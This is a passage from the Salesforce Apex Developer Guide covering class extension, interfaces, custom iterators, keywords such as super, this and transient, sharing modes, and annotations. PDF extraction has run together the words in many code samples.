// publicstaticintegerMyBadStaticProp{ returnNonStaticMember;}
publicstaticintegerMyGoodStaticProp{
get {returnStaticMember;}
set { StaticMember= value;}
}
publicintegerMyGoodNonStaticProp{
get {returnNonStaticMember;}
set { NonStaticMember= value;}
}
}
The following code segment calls the static and instance properties:
StaticPropertysp = new StaticProperty();
// The followingproducesa systemerror:a staticvariablecannotbe
// accessedthroughan objectinstance
// sp.MyGoodStaticProp= 5;
// The followingdoesnot producean error
StaticProperty.MyGoodStaticProp= 5;
Using Access Modifiers on Property Accessors
Property accessors can be defined with their own access modifiers. If an accessor includes its own access modifier, this modifier overrides
the access modifier of the property. The access modifier of an individual accessor must be more restrictive than the access modifier on
the property itself. For example, if the property has been defined as public, the individual accessor can’t be defined as global. The
following class definition shows additional examples:
globalvirtualclassPropertyVisibility{
// X is privatefor readand publicfor write
publicintegerX { privateget;set;}
// Y can be globallyreadbut onlywrittenwithina class
globalintegerY { get;publicset;}
// Z can be readwithinthe classbut onlysubclassescan set it
publicintegerZ { get;protectedset;}
}
Extending a Class
You can extend a class to provide more specialized behavior.
A class that extends another class inherits all the methods and properties of the extended class. In addition, the extending class can
override the existing virtual methods by using the override keyword in the method definition. Overriding a virtual method allows you
75
Classes, Objects, and InterfacesApex Developer Guide

to provide a different implementation for an existing method. This means that the behavior of a particular method is different based on
the object you’re calling it on. This is referred to as polymorphism.
A class extends another class using the extends keyword in the class definition. A class can only extend one other class, but it can
implement more than one interface.
This example shows how the YellowMarker class extends the Marker class. To run the inheritance examples in this section, first
create the Marker class.
publicvirtualclassMarker{
publicvirtualvoidwrite(){
System.debug('Writingsometext.');
}
publicvirtualDoublediscount(){
return.05;
}
}
Then create the YellowMarker class, which extends the Marker class.
// Extensionfor the Markerclass
publicclassYellowMarkerextendsMarker{
publicoverridevoidwrite(){
System.debug('Writingsometextusingthe yellowmarker.');
}
}
This code segment shows polymorphism. The example declares two objects of the same type (Marker). Even though both objects
are markers, the second object is assigned to an instance of the YellowMarker class. Hence, calling the write method on it yields
a different result than calling this method on the first object, because this method has been overridden. However, you can call the
discount method on the second object even though this method isn't part of the YellowMarker class definition. But it’s part
of the extended class, and hence, is available to the extending class, YellowMarker. Run this snippet in the Execute Anonymous
window of the Developer Console.
Markerobj1,obj2;
obj1= new Marker();
// Thisoutputs'Writingsometext.'
obj1.write();
obj2= new YellowMarker();
// Thisoutputs'Writingsometextusingthe yellowmarker.'
obj2.write();
// We get the discountmethodfor free
// and can callit fromthe YellowMarkerinstance.
Doubled = obj2.discount();
The extending class can have more method definitions that aren't common with the original extended class. In this example, the
RedMarker class extends the Marker class and has one extra method, computePrice, that isn't available for the Marker
class. To call the extra methods, the object type must be the extending class.
Before running the next snippet, create the RedMarker class, which requires the Marker class in your org.
// Extensionfor the Markerclass
publicclassRedMarkerextendsMarker{
publicoverridevoidwrite(){
System.debug('Writingsometextin red.');
76
Classes, Objects, and InterfacesApex Developer Guide

}
// Methodonlyin thisclass
publicDoublecomputePrice(){
return1.5;
}
}
This snippet shows how to call the additional method on the RedMarker class. Run this snippet in the Execute Anonymous window
of the Developer Console.
RedMarkerobj = new RedMarker();
// Callmethodspecificto RedMarkeronly
Doubleprice= obj.computePrice();
Extensions also apply to interfaces—an interface can extend another interface. As with classes, when an interface extends another
interface, all the methods and properties of the extended interface are available to the extending interface.
Versioned Behavior Changes
In API version 65.0 and later, an abstract or override method requires a protected, public, or global access modifier. If one of
these access modifiers isn’t explicitly included in the method declaration, then method access defaults to private. Private access is
invalid for these method types because the implementing class can’t access the abstract method. Therefore, if you attempt to declare
an abstract or override method without an allowed access modifier, you get the compilation error Abstractmethodsrequire
at leastone of the following:global, public, protected.
In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are
annotated with @namespaceAccessible. For accessibility considerations, see NamespaceAccessible Annotation. For more
information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.
Extended Class Example
The following is an extended example of a class, showing all the features of Apex classes. The keywords and concepts introduced in the
example are explained in more detail throughout this chapter.
// Top-level(outer)classmustbe publicor global(usuallypublicunlesstheycontain
// a Web Service,thentheymustbe global)
publicclassOuterClass{
// Staticfinalvariable(constant)– outerclasslevelonly
privatestaticfinalIntegerMY_INT;
// Non-finalstaticvariable- use thisto communicatestateacrosstriggers
// withina singlerequest)
publicstaticStringsharedState;
// Staticmethod- outerclasslevelonly
publicstaticIntegergetInt(){ returnMY_INT;}
// Staticinitialization(canbe includedwherethe variableis defined)
static{
MY_INT= 2;
}
77
Classes, Objects, and InterfacesApex Developer Guide

// Membervariablefor outerclass
privatefinalStringm;
// Instanceinitializationblock- can be donewherethe variableis declared,
// or in a constructor
{
m = 'a';
}
// Becauseno constructoris explicitlydefinedin thisouterclass,an implicit,
// no-argument,publicconstructorexists
// Innerinterface
publicvirtualinterfaceMyInterface{
// No accessmodifieris necessaryfor interfacemethods- theseare always
// publicor globaldependingon the interfacevisibility
voidmyMethod();
}
// Interfaceextension
interfaceMySecondInterfaceextendsMyInterface{
Integermethod2(Integeri);
}
// Innerclass- becauseit is virtualit can be extended.
// Thisclassimplementsan interfacethat,in turn,extendsanotherinterface.
// Consequentlythe classmustimplementall methods.
publicvirtualclassInnerClassimplementsMySecondInterface{
// Innermembervariables
privatefinalStrings;
privatefinalStrings2;
// Innerinstanceinitializationblock(thiscodecouldbe locatedabove)
{
this.s = 'x';
}
// Inlineinitialization(happensafterthe blockaboveexecutes)
privatefinalIntegeri = s.length();
// Explicitno argumentconstructor
InnerClass(){
// Thisinvokesanotherconstructorthatis definedlater
this('none');
}
// Constructorthatassignsa finalvariablevalue
publicInnerClass(Strings2) {
this.s2 = s2;
}
// Instancemethodthatimplementsa methodfromMyInterface.
78
Classes, Objects, and InterfacesApex Developer Guide

// Becauseit is declaredvirtualit can be overriddenby a subclass.
publicvirtualvoidmyMethod(){ /* doesnothing*/ }
// Implementationof the secondinterfacemethodabove.
// Thismethodreferencesmembervariables(withand withoutthe "this"prefix)
publicIntegermethod2(Integeri) { returnthis.i + s.length();}
}
// Abstractclass(thatsubclassesthe classabove).No constructoris neededsince
// parentclasshas a no-argumentconstructor
publicabstractclassAbstractChildClassextendsInnerClass{
// Overridethe parentclassmethodwiththissignature.
// Mustuse the overridekeyword
publicoverridevoidmyMethod(){ /* do somethingelse*/ }
// Samenameas parentclassmethod,but differentsignature.
// Thisis a differentmethod(displayingpolymorphism)so it doesnot need
// to use the overridekeyword
protectedvoidmethod2(){}
// Abstractmethod- subclassesof thisclassmustimplementthismethod
publicabstractIntegerabstractMethod();
}
// Completethe abstractclassby implementingits abstractmethod
publicclassConcreteChildClassextendsAbstractChildClass{
// Herewe expandthe visibilityof the parentmethod- notethatvisibility
// cannotbe restrictedby a sub-class
publicoverrideIntegerabstractMethod(){ return5; }
}
// A secondsub-classof the originalInnerClass
publicclassAnotherChildClassextendsInnerClass{
AnotherChildClass(Strings) {
// Explicitlyinvokea differentsuperconstructorthanone withno arguments
super(s);
}
}
// Exceptioninnerclass
publicvirtualclassMyExceptionextendsException{
// Exceptionclassmembervariable
publicDoubled;
// Exceptionclassconstructor
MyException(Doubled) {
this.d = d;
}
// Exceptionclassmethod,markedas protected
protectedvoiddoIt(){}
}
79
Classes, Objects, and InterfacesApex Developer Guide

// Exceptionclassescan be abstractand implementinterfaces
publicabstractclassMySecondExceptionextendsExceptionimplementsMyInterface{
}
}
This code example illustrates:
•
A top-level class definition (also called an outer class)
•
Static variables and static methods in the top-level class, as well as static initialization code blocks
•
Member variables and methods for the top-level class
•
Classes with no user-defined constructor — these have an implicit, no-argument constructor
•
An interface definition in the top-level class
•
An interface that extends another interface
•
Inner class definitions (one level deep) within a top-level class
•
A class that implements an interface (and, therefore, its associated sub-interface) by implementing public versions of the method
signatures
•
An inner class constructor definition and invocation
•
An inner class member variable and a reference to it using the this keyword (with no arguments)
•
An inner class constructor that uses the this keyword (with arguments) to invoke a different constructor
•
Initialization code outside of constructors — both where variables are defined, as well as with anonymous blocks in curly braces
({}). Note that these execute with every construction in the order they appear in the file, as with Java.
•
Class extension and an abstract class
•
Methods that override base class methods (which must be declared virtual)
•
The override keyword for methods that override subclass methods
•
Abstract methods and their implementation by concrete sub-classes
•
The protected access modifier
•
Exceptions as first class objects with members, methods, and constructors
This example shows how the class above can be called by other Apex code:
// Constructan instanceof an innerconcreteclass,witha user-definedconstructor
OuterClass.InnerClassic = new OuterClass.InnerClass('x');
// Calluser-definedmethodsin the class
System.assertEquals(2,ic.method2(1));
// Definea variablewithan interfacedatatype,and assignit a valuethatis of
// a typethatimplementsthatinterface
OuterClass.MyInterfacemi = ic;
// Use instanceofand castingas usual
OuterClass.InnerClassic2 = mi instanceofOuterClass.InnerClass?
(OuterClass.InnerClass)mi: null;
System.assert(ic2!= null);
// Constructthe outertype
OuterClasso = new OuterClass();
System.assertEquals(2,OuterClass.getInt());
80
Classes, Objects, and InterfacesApex Developer Guide

// Constructinstancesof abstractclasschildren
System.assertEquals(5,new OuterClass.ConcreteChildClass().abstractMethod());
// Illegal- cannotconstructan abstractclass
// new OuterClass.AbstractChildClass();
// Illegal– cannotaccessa staticmethodthroughan instance
// o.getInt();
// Illegal- cannotcallprotectedmethodexternally
// new OuterClass.ConcreteChildClass().method2();
This code example illustrates:
•
Construction of the outer class
•
Construction of an inner class and the declaration of an inner interface type
•
A variable declared as an interface type can be assigned an instance of a class that implements that interface
•
Casting an interface variable to be a class type that implements that interface (after verifying this using the instanceof operator)
Interfaces
An interface is like a class in which none of the methods have been implemented—the method signatures are there, but the body of
each method is empty. To use an interface, another class must implement it by providing a body for all of the methods contained in the
interface.
Interfaces can provide a layer of abstraction to your code. They separate the specific implementation of a method from the declaration
for that method. This way you can have different implementations of a method based on your specific application.
Defining an interface is similar to defining a new class. For example, a company can have two types of purchase orders, ones that come
from customers, and others that come from their employees. Both are a type of purchase order. Suppose you needed a method to
provide a discount. The amount of the discount can depend on the type of purchase order.
You can model the general concept of a purchase order as an interface and have specific implementations for customers and employees.
In the following example the focus is only on the discount aspect of a purchase order.
Here’s the definition of the PurchaseOrder interface.
// An interfacethatdefineswhata purchaseorderlookslikein general
publicinterfacePurchaseOrder{
// All otherfunctionalityexcluded
Doublediscount();
}
This class implements the PurchaseOrder interface for customer purchase orders.
// One implementationof the interfacefor customers
publicclassCustomerPurchaseOrderimplementsPurchaseOrder{
publicDoublediscount(){
return.05;// Flat5% discount
}
}
81
Classes, Objects, and InterfacesApex Developer Guide

This class implements the PurchaseOrder interface for employee purchase orders.
// Anotherimplementationof the interfacefor employees
publicclassEmployeePurchaseOrderimplementsPurchaseOrder{
publicDoublediscount(){
return.10;// It’sworthit beingan employee!10% discount
}
}
Note the following about the example:
•
The interface PurchaseOrder is defined as a general prototype. Methods defined within an interface have no access modifiers
and contain just their signature.
•
The CustomerPurchaseOrder class implements this interface; therefore, it must provide a definition for the discount
method. Any class that implements an interface must define all the methods contained in the interface.
When you define a new interface, you’re defining a new data type. You can use an interface name in any place you can use another data
type name. Any object assigned to a variable of type interface must be an instance of a class that implements the interface, or a
sub-interface data type.
See also Classes and Casting on page 116.
Note:  You can’t add a method to a global interface after the class has been uploaded in a Managed - Released package version.
Versioned Behavior Changes
In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are
annotated with @namespaceAccessible. For accessibility considerations, see NamespaceAccessible Annotation. For more
information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.
In API version 61.0 and later, private methods are no longer overridden by an instance method with the same signature in a subclass.
This change is versioned, so to prevent the override, update your abstract or virtual classes that contain private methods to API version
61.0 or later. In API version 60.0 and earlier, if a subclass declares an instance method with the same signature as a private method in
one of its superclasses, the subclass method overrides the private method.
1.Custom Iterators
Custom Iterators
An iterator traverses through every item in a collection. For example, in a procedural loop, you define a condition for exiting the loop,
and you must provide some means of traversing the collection, that is, an iterator. In this example, count is incremented by 1 every
time the loop is executed.
while(count< 11) {
System.debug(count);
count++;
}
Using the Iterator interface you can create a custom set of instructions for traversing a List through a loop. The iterator is useful for
data that exists in sources outside of Salesforce that you would normally define the scope of using a SELECT statement. Iterators can
also be used if you have multiple SELECT statements.
82
Classes, Objects, and InterfacesApex Developer Guide

Using Custom Iterators
To use custom iterators, you must create an Apex class that implements the Iterator interface.
The Iterator interface has the following instance methods:
DescriptionReturnsArgumentsName
Returns true if there’s another item in the collection being
traversed, false otherwise.
BooleanhasNext
Returns the next item in the collection.Any typenext
All methods in the Iterator interface must be declared as global or public.
This example code uses a custom iterator to iterate through a list of strings.
IterableStringx = new IterableString('Thisis a reallycooltest.');
while(x.hasNext()){
system.debug(x.next());
}
Using Custom Iterators with Iterable
If you don’t want to use a custom iterator with a list, but instead want to create your own data structure, you can use the Iterable
interface to generate the data structure.
The Iterable interface has the following method:
DescriptionReturnsArgumentsName
Returns a reference to the iterator for this interface.Iterator classiterator
The iterator method must be declared as global or public. It creates a reference to the iterator that you can then use to
traverse the data structure.
In the following example a custom iterator iterates through a collection:
publicclassCustomIterator
implementsIterator<Account>{
privateList<Account>accounts;
privateIntegercurrentIndex;
publicCustomIterator(List<Account>accounts){
this.accounts= accounts;
this.currentIndex= 0;
}
publicBooleanhasNext(){
returncurrentIndex< accounts.size();
}
83
Classes, Objects, and InterfacesApex Developer Guide

publicAccountnext(){
if(hasNext()){
returnaccounts[currentIndex++];
} else{
thrownew NoSuchElementException('Iteratorhas no moreelements.');
}
}
}
publicclassCustomIterableimplementsIterable<Account>{
publicIterator<Account>iterator(){
List<Account>accounts=
[SELECTId, Name,
NumberOfEmployees
FROMAccount
LIMIT10];
returnnew CustomIterator(accounts);
}
}
The following is a batch job that uses an iterator:
publicclassBatchClassimplementsDatabase.Batchable<Account>{
publicIterable<Account>start(Database.BatchableContextinfo){
returnnew CustomIterable();
}
publicvoidexecute(Database.BatchableContextinfo,List<Account>scope){
List<Account>accsToUpdate= new List<Account>();
for(Accountacc : scope){
acc.Name= 'changed';
acc.NumberOfEmployees= 69;
accsToUpdate.add(acc);
}
updateaccsToUpdate;
}
publicvoidfinish(Database.BatchableContextinfo){
}
}
Keywords
Apex provides the keywords final, instanceof, super, this, transient, withsharing and withoutsharing.
1.Using the final Keyword
2.Using the instanceof Keyword
3.Using the super Keyword
4.Using the this Keyword
5.Using the transient Keyword
84
Classes, Objects, and InterfacesApex Developer Guide

6.Use the with sharing, without sharing, and inherited sharing Keywords
Use the withsharing or withoutsharing keywords on a class to specify whether sharing rules must be enforced. Use
the inheritedsharing keyword on a class to run the class in the sharing mode of the class that called it.
SEE ALSO:
Reserved Keywords
Using the final Keyword
Keep in mind these consideration while using the final keyword to modify variables.
•
Final variables can be assigned a value only once. Static final variables can be initialized in static initialization code blocks or where
defined. Member final variables can be initialized in initialization code blocks, constructors, or where defined.
•
To define a constant, mark a variable as both static and final.
•
Non-final static variables are used to communicate state at the class level (such as state between triggers). However, they aren’t
shared across requests.
•
Methods and classes are final by default. You can’t use the final keyword in the declaration of a class or method. This means
they can’t be overridden. Use the virtual keyword if you need to override a method or class.
•
You can’t use the final keyword with properties.
SEE ALSO:
Extended Class Example
Using the instanceof Keyword
If you need to verify at run time whether an object is actually an instance of a particular class, use the instanceof keyword. The
instanceof keyword can only be used to verify if the target type in the expression on the right of the keyword is a viable alternative
for the declared type of the expression on the left.
You could add the following check to the Report class in the classes and casting example before you cast the item back into a
CustomReport object.
if (Reports.get(0)instanceofCustomReport){
// Can safelycastit backto a customreportobject
CustomReportc = (CustomReport)Reports.get(0);
} else{
// Do somethingwiththe non-custom-report.
}
Implementation Considerations
Keep these considerations in mind while using the instanceof keyword.
•
If the declared type on the left of the expression using the instanceof keyword is always an instance of the target type,
compilation fails. An example expression that’s always true and therefore causes a compilation error.
Accountacc = new Account();
if(accinstanceOfAccount){
//conditionis alwaystruesincean instanceof Accountis alwaysan instanceof
85
Classes, Objects, and InterfacesApex Developer Guide

Account
}
•
When you perform instanceof checks, implicit type casting from String to ID can result in unexpected behavior if the String
meets the requirements to be cast to an ID.
Versioned Behavior Changes
In API version 60.0 and later, if a List data type implements the Iterable data type, compilation fails. An example instanceof
expression that causes a compilation error.
publicclassBaseClass{}
publicclassSubClassextendsBaseClass{}
List<SubClass>subClasses= new List<SubClass>();
if(subClassesinstanceofIterable<BaseClass>){
//conditionis alwaystruesincean instanceof SubClassis alwaysan instanceof
BaseClass
}
In API version 32.0 and later, instanceof returns false if the left operand is a null object. In API version 31.0 and earlier,
instanceof returns true in this case. For example, the code sample returns false in API version 32.0 and later.
Objecto = null;
Booleanresult= o instanceofAccount;
System.assertEquals(false, result);
Using the super Keyword
The super keyword can be used by classes that are extended from virtual or abstract classes. By using super, you can override
constructors and methods from the parent class.
For example, if you have the following virtual class:
publicvirtualclassSuperClass{
publicStringmySalutation;
publicStringmyFirstName;
publicStringmyLastName;
publicSuperClass(){
mySalutation= 'Mr.';
myFirstName= 'Carl';
myLastName= 'Vonderburg';
}
publicSuperClass(Stringsalutation,StringfirstName,StringlastName){
mySalutation= salutation;
myFirstName= firstName;
myLastName= lastName;
}
publicvirtualvoidprintName(){
86
Classes, Objects, and InterfacesApex Developer Guide

System.debug('My nameis ' + mySalutation+ myLastName);
}
publicvirtualStringgetFirstName(){
returnmyFirstName;
}
}
You can create the following class that extends Superclass and overrides its printName method:
publicclassSubclassextendsSuperclass{
publicoverridevoidprintName(){
super.printName();
System.debug('Butyou can callme ' + super.getFirstName());
}
}
The expected output when calling Subclass.printName is My nameis Mr. Vonderburg.But you can call
me Carl.
You can also use super to call constructors. Add the following constructor to SubClass:
publicSubclass(){
super('Madam', 'Brenda', 'Clapentrap');
}
Now, the expected output of Subclass.printName is My nameis MadamClapentrap.But you can call
me Brenda.
Best Practices for Using the super Keyword
•
Only classes that are extending from virtual or abstract classes can use super.
•
You can only use super in methods that are designated with the override keyword.
Using the this Keyword
There are two different ways of using the this keyword.
You can use the this keyword in dot notation, without parenthesis, to represent the current instance of the class in which it appears.
Use this form of the this keyword to access instance variables and methods. For example:
publicclassmyTestThis{
strings;
{
this.s = 'TestString';
}
}
In the above example, the class myTestThis declares an instance variable s. The initialization code populates the variable using the
this keyword.
87
Classes, Objects, and InterfacesApex Developer Guide

Or you can use the this keyword to do constructor chaining, that is, in one constructor, call another constructor. In this format, use
the this keyword with parentheses. For example:
publicclasstestThis{
// Firstconstructorfor the class.It requiresa stringparameter.
publictestThis(strings2) {
}
// Secondconstructorfor the class.It doesnot requirea parameter.
// Thisconstructorcallsthe firstconstructorusingthe thiskeyword.
publictestThis(){
this('None');
}
}
When you use the this keyword in a constructor to do constructor chaining, it must be the first statement in the constructor.
Using the transient Keyword
Use the transient keyword to declare instance variables that can't be saved, and shouldn't be transmitted as part of the view state
for a Visualforce page. For example:
TransientIntegercurrentTotal;
You can also use the transient keyword in Apex classes that are serializable, namely in controllers, controller extensions, or classes
that implement the Batchable or Schedulable interface. In addition, you can use transient in classes that define the types
of fields declared in the serializable classes.
Declaring variables as transient reduces view state size. A common use case for the transient keyword is a field on a Visualforce
page that is needed only for the duration of a page request, but should not be part of the page's view state and would use too many
system resources to be recomputed many times during a request.
Some Apex objects are automatically considered transient, that is, their value does not get saved as part of the page's view state. These
objects include the following:
•
PageReferences
•
XmlStream classes
•
Collections automatically marked as transient only if the type of object that they hold is automatically marked as transient, such as
a collection of Savepoints
•
Most of the objects generated by system methods, such as Schema.getGlobalDescribe.
•
JSONParser class instances.
Static variables also don't get transmitted through the view state.
The following example contains both a Visualforce page and a custom controller. Clicking the refresh button on the page causes the
transient date to be updated because it is being recreated each time the page is refreshed. The non-transient date continues to have
its original value, which has been deserialized from the view state, so it remains the same.
<apex:pagecontroller="ExampleController">
T1: {!t1}<br/>
T2: {!t2}<br/>
<apex:form>
<apex:commandLinkvalue="refresh"/>
88
Classes, Objects, and InterfacesApex Developer Guide

</apex:form>
</apex:page>
publicclassExampleController{
DateTimet1;
transientDateTimet2;
publicStringgetT1(){
if (t1 == null) t1 = System.now();
return'' + t1;
}
publicStringgetT2(){
if (t2 == null) t2 = System.now();
return'' + t2;
}
}
SEE ALSO:
Apex Reference Guide: JSONParser Class
Use the withsharing, withoutsharing, and inheritedsharing Keywords
Use the withsharing or withoutsharing keywords on a class to specify whether sharing rules must be enforced. Use the
inheritedsharing keyword on a class to run the class in the sharing mode of the class that called it.
Tip:  For information about how sharing rules are defined, see Sharing Rules in Salesforce Help.
With Sharing
Use the withsharing keyword when declaring a class to enforce sharing rules of the current user. Explicitly setting this keyword
ensures that Apex code runs in the current user context. Apex code that is executed with the executeAnonymous call and Connect
in Apex always execute using the sharing rules of the current user. For more information on executeAnonymous, see Anonymous
Blocks on page 262.
Use the withsharing keywords when declaring a class to enforce the sharing rules that apply to the current user. For example:
publicwithsharingclasssharingClass{
// Codehere
}
Without Sharing
Use the withoutsharing keyword when declaring a class to ensure that the sharing rules for the current user aren’t enforced.
For example, to turn off sharing rule enforcement for a class that’s called by a class that has sharing rules enforced, use the without
sharing keyword on the called class.
publicwithoutsharingclassnoSharing{
89
Classes, Objects, and InterfacesApex Developer Guide

// Codehere
}
Inherited Sharing
Use the inheritedsharing keyword when declaring a class to enforce the sharing rules of the class that calls it. Using
inheritedsharing is an advanced technique to determine the sharing mode at runtime and design Apex classes that can run
in either withsharing or withoutsharing mode.
Warning:  Because the sharing mode is determined at runtime, you must take extreme care to ensure that your Apex code is
secure to run in both withsharing and withoutsharing modes.
Using inheritedsharing, along with other appropriate security checks, facilitates in passing AppExchange security review and
ensures that your privileged Apex code isn’t used in unexpected or insecure ways. An Apex class with inheritedsharing runs
as withsharing if used as:
•
An Aura component controller
•
An @AuraEnabled method called from a Lightning web component
•
A Visualforce controller
•
An Apex REST service
•
An asynchronous Apex class
•
Any other entry point to an Apex transaction
Using the inheritedsharing keyword ensures that the default is to run as withsharing. A class declared as inherited
sharing runs as withoutsharing only if explicitly called from an already established withoutsharing context.
Example:  This example declares an Apex class with inheritedsharing and a Visualforce invocation of that Apex code.
Because of the inheritedsharing declaration, only contacts for which the running user has sharing access are displayed.
If the declaration is omitted, contacts that the user has no rights to view are displayed due to the insecure default behavior.
publicinheritedsharingclassInheritedSharingClass{
publicList<Contact>getAllTheSecrets(){
return[SELECTNameFROMContact];
}
}
<apex:pagecontroller="InheritedSharingClass">
<apex:repeatvalue="{!allTheSecrets}"var="record">
{!record.Name}
</apex:repeat>
</apex:page>
Omitted Sharing Declarations
Important:  Apex without an explicit sharing declaration is insecure by default. We strongly recommend that you always specify
a sharing declaration for a class.
If a class isn’t explicitly declared as either withsharing or withoutsharing, the current sharing rules remain in effect.
Therefore, the class doesn’t enforce sharing rules except if it acquires sharing rules from another class. For example, if the class is called
by another class that has sharing enforced, then sharing is enforced for the called class.
90
Classes, Objects, and InterfacesApex Developer Guide

There’s a distinct difference between an Apex class that’s explicitly marked with inheritedsharing and one with an omitted
sharing declaration. For these entry points to an Apex transaction, an omitted sharing declaration defaults to these sharing modes:
•
An Aura component controller: withsharing
•
An @AuraEnabled method called from a Lightning web component: withsharing
•
A Visualforce controller: withoutsharing
•
An Apex REST service: withoutsharing
•
An asynchronous Apex class: withoutsharing
•
Any other entry point to an Apex transaction: withoutsharing
Implementation in Apex Triggers
Apex triggers can’t have an explicit sharing declaration. Triggers typically run as withoutsharing, meaning that sharing rules for
the current user aren’t enforced. However, a nested trigger that fires due to the execution of another trigger runs as withsharing
in the following circumstances:
•
A DML operation that runs in user mode on page 213 invokes the nested trigger. For example, given this sample code, if an account
is inserted into the database, then ContactTrigger1 runs as withsharing.
// Triggerfiresin withoutsharingmode
triggerAccountTrigger1on Account(beforeinsert) {
// DML operationrunsin usermode(sharingrulesare applied)
insertas usernew Contact(FirstName='Test', LastName='Test2');
}
triggerContactTrigger1on Contact(beforeinsert) {
// Statementsin thisnestedtriggerrun in withsharingmode
// Callsto otherclassesuse the declaredsharingmodeof eachclass
}
•
A DML operation in a method of a class that enforces sharing rules invokes the nested trigger. The class can enforce sharing rules
explicitly with the withsharing declaration or inherit the sharing declaration. For example, given this sample code, if an
account is inserted into the database, then ContactTrigger2 runs as withsharing.
// Triggerfiresin withoutsharingmode
triggerAccountTrigger2on Account(beforeinsert) {
// Callto ContactInsertusessharingmodeof thatclass(withsharing)
ContactInsert.run();
}
publicwithsharingclassContactInsert{
publicstaticvoidrun(){
insertnew Contact(FirstName='Test', LastName='Test2');
}
}
triggerContactTrigger2on Contact(beforeinsert) {
// Statementsin thisnestedtriggerrun in withsharingmode
// Callsto otherclassesuse the declaredsharingmodeof eachclass
}
In both cases, after the nested trigger fires in withsharing mode, subsequent calls to other classes use the declared sharing mode
of each class.
91
Classes, Objects, and InterfacesApex Developer Guide

Other Implementation Details
•
The sharing setting of the class where a method is defined is applied, not of the class where the method is called from. For example,
if a method is defined in a class declared as withsharing is called by a class declared as withoutsharing, the method
executes with sharing rules enforced.
•
Both inner classes and outer classes can be declared as withsharing. Inner classes do not inherit the sharing setting from their
container class. Otherwise, the sharing setting applies to all code contained in the class, including initialization code, constructors,
and methods.
•
Classes inherit the sharing setting from a parent class when one class extends another.
•
Asynchronous Apex classes defined with inheritedsharing always run in withsharing mode for asynchronous
operations. Each asynchronous operation is a new entry point and the sharing mode is not serialized.
Best Practices
Apex without an explicit sharing declaration is insecure by default. We strongly recommend that you always specify a sharing declaration
for a class.
Regardless of the sharing mode, object-level access and field-level security aren’t enforced by Apex. You must enforce object-level access
and field-level security in your SOQL queries or code. For example, withsharing mechanism doesn’t enforce user’s access to view
reports and dashboards. You must explicitly enforce the running user’s CRUD (Create, Read, Update, Delete) and field-level security in
your code. See Enforcing Object and Field Permissions.
When to UseSharing Mode
Use this mode as the default unless your use case requires
otherwise.
withsharing
Use this mode with caution. Ensure that you don’t inadvertently
expose sensitive data that’s normally hidden by the sharing mode.
withoutsharing
This sharing mechanism is best used to grant targeted elevation
of sharing privileges to the current user.
For example, use withoutsharing to allow community
users to read records to which they wouldn’t otherwise have access.
Use this mode for service classes that must be flexible and support
use cases with different sharing modes.
inheritedsharing
Annotations
An Apex annotation modifies the way that a method or class is used, similar to annotations in Java. Annotations are defined with an
initial @ symbol, followed by the appropriate keyword.
To add an annotation to a method, specify it immediately before the method or class definition. For example:
globalclassMyClass{
@Future
PublicstaticvoidmyMethod(Stringa)
{
//long-runningApexcode
92
Classes, Objects, and InterfacesApex Developer Guide

}
}
Apex supports these annotations.
•
@AuraEnabled
•
@Deprecated
•
@Future
•
@InvocableMethod
•
@InvocableVariable
•
@IsTest
•
@JsonAccess
•
@NamespaceAccessible
•
@ReadOnly
•
@RemoteAction
•
@SuppressWarnings
•
@TestSetup
•
@TestVisible
•
Apex REST annotations:
–
@ReadOnly
–
@RestResource(urlMapping='/yourUrl')
–
@HttpDelete
–
@HttpGet
–
@HttpPatch
–
@HttpPost
–
@HttpPut
You can use multiple annotations for the same class or method. Specify each annotation on a separate line immediately before the class
or method definition. Some annotations can’t be used together. If applicable, these limitations are documented on the page for the
annotation.
1.AuraEnabled Annotation
2.Deprecated Annotation
3.Future Annotation
4.InvocableMethod Annotation
Use the InvocableMethod annotation to identify methods that can be run as invocable actions.
5.InvocableVariable Annotation
To identify variables used by invocable methods in custom classes, use the InvocableVariable annotation.
6.IsTest Annotation
7.JsonAccess Annotation
The @JsonAccess annotation defined at Apex class level controls whether instances of the class can be serialized or deserialized.
If the annotation restricts the JSON or XML serialization and deserialization, a runtime JSONException exception is thrown.
93
Classes, Objects, and InterfacesApex Developer Guide

8.NamespaceAccessible Annotation
9.ReadOnly Annotation
10.RemoteAction Annotation
11.SuppressWarnings Annotation
This annotation does nothing in Apex but can be used to provide information to third-party tools.
12.TestSetup Annotation
Methods defined with the @TestSetup annotation are used for creating common test records that are available for all test
methods in the class.
13.TestVisible Annotation
AuraEnabled Annotation
The @AuraEnabled annotation enables client-side and server-side access to an Apex controller method. Providing this annotation
makes your methods available to your Lightning components (both Lightning web components and Aura components). Only methods
with this annotation are exposed.
In API version 44.0 and later, you can improve runtime performance by caching method results on the client by using the annotation
@AuraEnabled(cacheable=true). You can cache method results only for methods that retrieve data but don’t modify it.
Using this annotation eliminates the need to call setStorable() in JavaScript code on every action that calls the Apex method.
In API version 55.0 and later, you can use the annotation @AuraEnabled(cacheable=truescope='global') to enable
Apex methods to be cached in a global cache.
For more information, see Lightning Aura Components Developer Guide and Lightning Web Components Developer Guide.
Versioned Behavior Changes
In API version 55.0 and later, overloads aren’t allowed on methods annotated with @AuraEnabled.
Deprecated Annotation
Use the Deprecated annotation to identify methods, classes, exceptions, enums, interfaces, or variables that can no longer be
referenced in subsequent releases of the managed package in which they reside. This annotation is useful when you’re refactoring code
in managed packages as the requirements evolve. New subscribers can’t see the deprecated elements, while the elements continue to
function for existing subscribers and API integrations.
The following code snippet shows a deprecated method. The same syntax can be used to deprecate classes, exceptions, enums, interfaces,
or variables.
@Deprecated
// Thismethodis deprecated.Use myOptimizedMethod(Stringa, Stringb) instead.
globalvoidmyMethod(Stringa) {
}
Note the following rules when deprecating Apex identifiers:
•
Unmanaged packages can’t contain code that uses the deprecated keyword.
•
When an Apex item is deprecated, all global access modifiers that reference the deprecated identifier must also be deprecated.
Any global method that uses the deprecated type in its signature, either in an input argument or the method return type, must also
be deprecated. A deprecated item, such as a method or a class, can still be referenced internally by the package developer.
•
webservice methods and variables can’t be deprecated.
94
Classes, Objects, and InterfacesApex Developer Guide

•
You can deprecate an enum but you can’t deprecate individual enum values.
•
You can deprecate an interface but you can’t deprecate individual methods in an interface.
•
You can deprecate an abstract class but you can’t deprecate individual abstract methods in an abstract class.
•
You can’t remove the Deprecated annotation to undeprecate something in Apex after you’ve released a package version where
